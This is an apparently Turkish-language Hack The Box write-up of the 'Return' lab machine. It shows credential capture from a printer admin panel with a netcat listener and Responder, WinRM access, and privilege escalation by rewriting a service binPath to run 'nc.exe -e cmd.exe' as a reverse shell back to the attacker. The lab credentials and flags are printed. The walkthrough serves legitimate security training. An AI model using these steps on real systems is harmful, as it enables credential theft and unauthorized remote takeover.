Return HTB Writeup 

#### About

Return is an easy difficulty Windows machine featuring a network printer administration panel that stores LDAP credentials. These credentials can be captured by inputting a malicious LDAP server which allows obtaining foothold on the server through the WinRM service. User found to be part of a privilege group which further exploited to gain system access.

İlk olarak nmap taraması ile başlıyoruz 
- nmap -sS -A -T5 -p- 10.129.51.69

53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: HTB Printer Admin Panel
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-09-01 20:01:46Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local, Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local, Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
9389/tcp  open  mc-nmf        .NET Message Framing
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         Microsoft Windows RPC
49665/tcp open  msrpc         Microsoft Windows RPC
49666/tcp open  msrpc         Microsoft Windows RPC
49668/tcp open  msrpc         Microsoft Windows RPC
49671/tcp open  msrpc         Microsoft Windows RPC
49674/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
49675/tcp open  msrpc         Microsoft Windows RPC
49676/tcp open  msrpc         Microsoft Windows RPC
49680/tcp open  msrpc         Microsoft Windows RPC
49694/tcp open  msrpc         Microsoft Windows RPC
Device type: general purpose
Running: Microsoft Windows 2019
OS CPE: cpe:/o:microsoft:windows_server_2019
OS details: Microsoft Windows Server 2019
Network Distance: 2 hops
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2026-09-01T20:02:46
|_  start_date: N/A
|_clock-skew: 18m38s
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required


İlk olarak 80 portundaki web portuna odaklanalım 

Siteye gidince ##   
HTB Printer Admin Panel karşımıza çıkıyor ve /setting kısmına gidince de 
|   |   |
|---|---|
|Server Address|| printer.return.local 
|Server Port|| 389 
|Username|| svc-printer 
|Password||****** *************************
||   |   | değerleri ile oynayabildiğimizi görüyoruz 


şimdi server adress yerine kendi ipmizi yazabiliriz ve 389 portunu dinleyerek gelen giden bilgilere bakabiliriz 


─# rlwrap nc -nvlp 389                                                                                                            
listening on [any] 389 ...
connect to [10.10.14.187] from (UNKNOWN) [10.129.51.69] 64032
0*`%return\svc-printer�
0*`%return\svc-printer�
 1edFg43012!!
 ve sonuç olarak böyle bir şifre aldık 
isterseniz responde da kullanabilirsiniz

- sudo responder -I tun0
[LDAP] Cleartext Client   : 10.129.51.69
[LDAP] Cleartext Username : return\svc-printer
[LDAP] Cleartext Password : 1edFg43012!!

Şimdi nxc kullanarak bilgileri doğrulayalım 

┌──(root㉿kali)-[/home/kali/toolkit]
└─# nxc smb 10.129.51.69 -u return\svc-printer -p '1edFg43012!!'                
[*] First time use detected
[*] Creating home directory structure
[*] Creating missing folder logs
[*] Creating missing folder modules
[*] Creating missing folder workspaces
[*] Creating missing folder obfuscated_scripts
[*] Creating missing folder screenshots
[*] Creating missing folder logs/sam
[*] Creating missing folder logs/lsa
[*] Creating missing folder logs/ntds
[*] Creating missing folder logs/dpapi
[*] Creating default workspace
[*] Initializing VNC protocol database
[*] Initializing SSH protocol database
[*] Initializing WINRM protocol database
[*] Initializing RDP protocol database
[*] Initializing SMB protocol database
[*] Initializing WMI protocol database
[*] Initializing LDAP protocol database
[*] Initializing FTP protocol database
[*] Initializing NFS protocol database
[*] Initializing MSSQL protocol database
[*] Copying default configuration file
SMB         10.129.51.69    445    PRINTER          [*] Windows 10 / Server 2019 Build 17763 x64 (name:PRINTER) (domain:return.local) (signing:True) (SMBv1:None) (Null Auth:True)
SMB         10.129.51.69    445    PRINTER          [-] return.local\returnsvc-printer:1edFg43012!! STATUS_LOGON_FAILURE 


şimdi bu bilgileri kullanarak smb içinden veri çekelim 

- smbmap -H 10.129.51.69 -u svc-printer -p '1edFg43012!!'    

[+] IP: 10.129.51.69:445	Name: 10.129.51.69        	Status: Authenticated
	Disk                                                  	Permissions	Comment
	----                                                  	-----------	-------
	ADMIN$                                            	READ ONLY	Remote Admin
	C$                                                	READ ONLY	Default share
	IPC$                                              	READ ONLY	Remote IPC
	NETLOGON                                          	READ ONLY	Logon server share 
	SYSVOL                                            	READ ONLY	Logon server share 

evil-winrm kullanarak bağlanalım 

evil-winrm -i 10.129.51.69 -u 'svc-printer' -p '1edFg43012!!'
*Evil-WinRM* PS C:\Users\svc-printer\Documents> ve shell geldi 


*Evil-WinRM* PS C:\Users\svc-printer> ls


    Directory: C:\Users\svc-printer


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---        5/26/2021   2:05 AM                Desktop
d-r---        5/26/2021   1:51 AM                Documents
d-r---        9/15/2018  12:19 AM                Downloads
d-r---        9/15/2018  12:19 AM                Favorites
d-r---        9/15/2018  12:19 AM                Links
d-r---        9/15/2018  12:19 AM                Music
d-r---        9/15/2018  12:19 AM                Pictures
d-----        9/15/2018  12:19 AM                Saved Games
d-r---        9/15/2018  12:19 AM                Videos


*Evil-WinRM* PS C:\Users\svc-printer> cd Desktop
ls
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> ls


    Directory: C:\Users\svc-printer\Desktop


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
-ar---         9/1/2026  12:58 PM             34 user.txt


*Evil-WinRM* PS C:\Users\svc-printer\Desktop> cat user.txt
ffafef38c60fa87f5cbd1f1591fbfffa
*Evil-WinRM* PS C:\Users\svc-printer\Desktop> 
 ve ilk flagimizi alıypruz 

Şimdi sistemde gezinelim ve araştırma yapalım privesc için 

*Evil-WinRM* PS C:\Users\svc-printer\Documents> net user Administrator
User name                    Administrator
Full Name
Comment                      Built-in account for administering the computer/domain
User's comment
Country/region code          000 (System Default)
Account active               Yes
Account expires              Never

Password last set            7/16/2021 8:03:22 AM
Password expires             Never
Password changeable          7/17/2021 8:03:22 AM
Password required            Yes
User may change password     Yes

Workstations allowed         All
Logon script
User profile
Home directory
Last logon                   9/1/2026 12:58:07 PM

Logon hours allowed          All

Local Group Memberships      *Administrators
Global Group memberships     *Domain Users         *Group Policy Creator
                             *Schema Admins        *Enterprise Admins
                             *Domain Admins
 *Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami /groups
GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288

bu iki çıktı üzerinden sunucu operatör grubu göze çarpıyor bunun üzerine odaklanalım 

https://raw.githubusercontent.com/Hackplayers/PsCabesha-tools/master/Privesc/Acl-FullControl.ps1  `SeBackupPrivilege` için bunu kullanarak yetki yükseltme yapabiliriz 


Şimdi yerel ayrıcalık yükseltme (LPE) işlemini gerçekleştirmenin bir yolunu bulmamız gerekiyor. Evil-winrm'nin yerleşik bir menüsü var ve bu menü bize mevcut hizmetlerimizi ve hangi ayrıcalıklara sahip olduğumuzu gösteriyor. Hizmet üzerinde başlatma/durdurma ayrıcalıklarına sahip olduğumuzu görüyoruz `VMTools`.

*Evil-WinRM* PS C:\Users\svc-printer\Documents> menu


   ,.   (   .      )               "            ,.   (   .      )       .   
  ("  (  )  )'     ,'             (`     '`    ("     )  )'     ,'   .  ,)  
.; )  ' (( (" )    ;(,      .     ;)  "  )"  .; )  ' (( (" )   );(,   )((   
_".,_,.__).,) (.._( ._),     )  , (._..( '.._"._, . '._)_(..,_(_".) _( _')  
\_   _____/__  _|__|  |    ((  (  /  \    /  \__| ____\______   \  /     \  
 |    __)_\  \/ /  |  |    ;_)_') \   \/\/   /  |/    \|       _/ /  \ /  \ 
 |        \\   /|  |  |__ /_____/  \        /|  |   |  \    |   \/    Y    \
/_______  / \_/ |__|____/           \__/\  / |__|___|  /____|_  /\____|__  /
        \/                               \/          \/       \/         \/

       By: CyberVaca, OscarAkaElvis, Jarilaos, Arale61 @Hackplayers

[+] Bypass-4MSI
[+] services
[+] upload
[+] download
[+] clear
[+] cls
[+] menu
[+] exit

*Evil-WinRM* PS C:\Users\svc-printer\Documents> services

Path                                                                                                                 Privileges Service          
----                                                                                                                 ---------- -------          
C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS             
\??\C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{5533AFC7-64B3-4F6E-B453-E35320B35716}\MpKslDrv.sys       True MpKslceeb2796    
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                              True NetTcpPortSharing
C:\Windows\SysWow64\perfhost.exe                                                                                           True PerfHost         
"C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                                                False Sense            
C:\Windows\servicing\TrustedInstaller.exe                                                                                 False TrustedInstaller 
"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                                                     True VGAuthService    
"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                                                        True VMTools          
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\NisSrv.exe"                                             True WdNisSvc         
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\MsMpEng.exe"                                            True WinDefend        
"C:\Program Files\Windows Media Player\wmpnetwk.exe"                                                                      False WMPNetworkSvc    

*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe query VMTools
 

SERVICE_NAME: VMTools
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 4  RUNNING
                                (STOPPABLE, PAUSABLE, ACCEPTS_PRESHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe stop VMTools

SERVICE_NAME: VMTools
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0
*Evil-WinRM* PS C:\Users\svc-printer\Documents> locate nc.exe
 
The term 'locate' is not recognized as the name of a cmdlet, function, script file, or operable program. Check the spelling of the name, or if a path was included, verify that the path is correct and try again.
At line:1 char:1
+ locate nc.exe
+ ~~~~~~
    + CategoryInfo          : ObjectNotFound: (locate:String) [], CommandNotFoundException
    + FullyQualifiedErrorId : CommandNotFoundException
*Evil-WinRM* PS C:\Users\svc-printer\Documents> upload nc.exe . 
                                        
Error: Upload failed. Check filenames or paths: Source file does not exist: /home/kali/nc.exe
*Evil-WinRM* PS C:\Users\svc-printer\Documents> upload nc.exe . 
                                        
Info: Uploading /home/kali/nc.exe to C:\Users\svc-printer\Documents\.
                                        
Data: 37544 bytes of 37544 bytes copied
                                        
Info: Upload successful!
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe config VMTools binPath="C:\Users\\svc-printer\documents\nc.exe -e cmd.exe 10.10.14.187 1337"
[SC] ChangeServiceConfig SUCCESS
*Evil-WinRM* PS C:\Users\svc-printer\Documents> sc.exe start VMTools 


VE SHELL GELDİ 
──(root㉿kali)-[/home/kali]
└─# rlwrap nc -nvlp 1337
listening on [any] 1337 ...
connect to [10.10.14.187] from (UNKNOWN) [10.129.51.69] 50654
Microsoft Windows [Version 10.0.17763.107]
(c) 2018 Microsoft Corporation. All rights reserved.
~~~~~~
C:\Windows\system32>ls

C:\Users>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 3A0C-428E

 Directory of C:\Users

05/26/2021  01:51 AM    <DIR>          .
05/26/2021  01:51 AM    <DIR>          ..
09/27/2021  04:40 AM    <DIR>          Administrator
05/26/2021  01:50 AM    <DIR>          Public
05/26/2021  01:51 AM    <DIR>          svc-printer
               0 File(s)              0 bytes
               5 Dir(s)   8,821,932,032 bytes free

C:\Users>cd Administrator
cd Administrator

C:\Users\Administrator>cd Desktop
cd Desktop

C:\Users\Administrator\Desktop>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 3A0C-428E

 Directory of C:\Users\Administrator\Desktop

09/27/2021  04:22 AM    <DIR>          .
09/27/2021  04:22 AM    <DIR>          ..
09/01/2026  12:58 PM                34 root.txt
               1 File(s)             34 bytes
               2 Dir(s)   8,821,932,032 bytes free

C:\Users\Administrator\Desktop>type root.txt
type root.txt
924469a2a0f2fc8c5b8be6f50d57190e


ve son flagi de aldık 
